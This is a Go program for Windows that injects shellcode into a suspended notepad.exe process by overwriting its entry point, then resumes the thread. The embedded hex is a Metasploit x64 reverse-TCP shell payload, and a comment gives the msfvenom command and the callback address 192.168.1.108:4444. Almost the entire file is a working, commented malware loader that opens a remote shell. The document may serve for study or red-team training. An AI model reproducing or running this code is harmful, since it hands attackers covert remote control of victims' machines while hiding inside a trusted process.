package main

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"log"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Holds process information from winAPI
type PROCESS_BASIC_INFORMATION struct {
	Reserved1    uintptr
	PebAdrress   uintptr //Pointer to process Environment Block(PEB)
	Reserved2    uintptr
	Reserved3    uintptr
	UniquePid    uintptr //Process ID
	MoreReserved uintptr
}

func main() {
	//Kali> msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.108 LPORT=4444 -f hex
	sc, _ := hex.DecodeString("fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc0200115cc0a8016c41544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd550504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd54881c44002000049b8636d640000000000415041504889e25757574d31c06a0d594150e2fc66c74424540101488d442418c600684889e6565041504150415049ffc0415049ffc84d89c14c89c141ba79cc3f86ffd54831d248ffca8b0e41ba08871d60ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5")

	//process startup and information structures
	var startupInfo windows.StartupInfo
	var outProcInfo windows.ProcessInformation

	//Path to our notepad
	path := "C:\\Windows\\System32\\notepad.exe"

	//Create notepad.exe process in a suspened state
	//CREATE_SUSPENDED flag(0x000000004) creates process but doesn't run it yet
	err := windows.CreateProcess(nil,
		windows.StringToUTF16Ptr(path), //Path to exe
		nil,                            //Process security attributes
		nil,                            //Thread security attributes
		false,                          //Inherit handlers
		windows.CREATE_SUSPENDED,       //Creation flags- suspendedstate
		nil,                            //Environment
		nil,                            //Current directory
		&startupInfo,                   //Startup Info
		&outProcInfo)                   //Process information

	if err != nil {
		log.Fatalf("[-]Failed to create Process: %v", err)
	}

	fmt.Printf("[+]Process Created from path: %s with PID: %d \n", path, outProcInfo.ProcessId)
	fmt.Printf("[+] Process Handle: %x \n[+] Thread Handle: %x \n", outProcInfo.Process, outProcInfo.Thread)

	//QUery process information to find the PEB(Process Environment Block)
	var ProcessInformation PROCESS_BASIC_INFORMATION
	ProcessInformationLength := uint32(unsafe.Sizeof(uintptr(0)))
	var ReturnLength uint32

	//NTQueryInformationProcess gets detailed process info including PEB location
	err = windows.NtQueryInformationProcess(outProcInfo.Process, 0, unsafe.Pointer(&ProcessInformation), ProcessInformationLength*6, &ReturnLength)

	if err != nil {
		log.Fatalf("[-]Failed to QUery Information Process: %v", err)
	}

	//PEB + 0x10 offset contains the ImageBaseAddress Pointer
	//This is where the exe is loaded in memory
	imageBaseAddress := uint64(ProcessInformation.PebAdrress + 0x10)
	fmt.Printf("[+]Address holding image base address: 0x%x \n", imageBaseAddress)

	//Read the actual image base address from memory
	lpBuffer := make([]byte, unsafe.Sizeof(uintptr(0)))
	var lpNumberOfBytesRead uintptr

	err = windows.ReadProcessMemory(outProcInfo.Process, uintptr(imageBaseAddress), &lpBuffer[0], uintptr(len(lpBuffer)), &lpNumberOfBytesRead)

	if err != nil {
		log.Fatalf("[-] Failed to ReadProcessMemory --ImageBaseAddress: %v", err)
	}
	fmt.Printf("[+]Number of bytes read: %d\n", lpNumberOfBytesRead)

	//Convert bytes to actual memory address(little endian format)
	lpBaseAddres := binary.LittleEndian.Uint64(lpBuffer)
	fmt.Printf("[+Image base: 0x%x\n", lpBaseAddres)

	//Read the PE header to find the entry point
	lpBuffer = make([]byte, 0x200) //Buffer for PE header

	err = windows.ReadProcessMemory(outProcInfo.Process, uintptr(lpBaseAddres), &lpBuffer[0], uintptr(len(lpBuffer)), &lpNumberOfBytesRead)

	if err != nil {
		log.Fatalf("[+]Failed to Read memory address: IPBaseAddress%v", err)
	}

	//PE header starts at offset 0x3C- this contains the PE signature offset
	lfaNewPos := lpBuffer[0x3c : 0x3c+0x4]
	Ifanew := binary.LittleEndian.Uint32(lfaNewPos)
	fmt.Printf("[+PE signature offser: 0x%x\n", Ifanew)

	//Entry Point Relative Virtual Address is at PE header + 0x28
	entrypointOffset := Ifanew + 0x28
	entrypointOffsetPos := lpBuffer[entrypointOffset : entrypointOffset+0x4]
	entrypoinRVA := binary.LittleEndian.Uint32(entrypointOffsetPos)
	fmt.Printf("[+] Entry Point Offset: 0x%x\n", entrypoinRVA)

	//Calculate actual entry point address in memory
	entrypointAddress := lpBaseAddres + uint64(entrypoinRVA)
	fmt.Printf("[+] Entry Point Address Identified 0x%x\n", entrypointAddress)

	//write shellcode to the entry point- this is the actial code replacement
	var numberOfBytesWritten uintptr

	err = windows.WriteProcessMemory(outProcInfo.Process, uintptr(entrypointAddress), &sc[0], uintptr(len(sc)), &numberOfBytesWritten)

	if err != nil {
		log.Fatalf("[-] Failed to WriteProcessMemory: %v", err)
	}

	fmt.Printf("[+] Wrote %d%d shellcode bytes to destinamation address\n", numberOfBytesWritten, len(sc))

	//Resumes the suspended thread this executes shellcode instead of the original program
	_, err = windows.ResumeThread(windows.Handle(outProcInfo.Thread))

	if err != nil {
		log.Fatalf("[-] Cant resume thead. %v\n", err)
	}
	fmt.Println("[+]Resuming Suspended Thread- Shellcode should execute now!")

	/*
		NOTE: The original notepad.exe is replaced with our shellcode
		When resumed, it will run our reverse TCP
	*/
}
